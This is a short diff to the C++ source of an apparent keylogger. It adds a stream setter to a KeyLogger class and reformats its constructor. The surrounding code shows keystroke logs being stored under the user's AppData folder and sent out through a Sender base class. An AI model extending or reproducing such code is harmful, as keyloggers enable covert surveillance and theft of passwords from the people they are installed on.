@@ -173,6 +173,10 @@ bool KeyLogger::logsExists() const {
 
 }
 
+void KeyLogger::setStream(const Stream & stream){
+    this->stream=stream;
+}
+
 void KeyLogger::send() {
     sendLastKeyloggerLog();
 }
@@ -210,7 +214,8 @@ void KeyLogger::stopKeylogger(){
     recordingKeys = false;
 }
 
-KeyLogger::KeyLogger(const Stream &stream) : Sender(stream) {
+KeyLogger::KeyLogger(const Stream & stream) : Sender(stream) {
     pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER) + L"\\";
     logsFileName = generateLogName();
 }
+
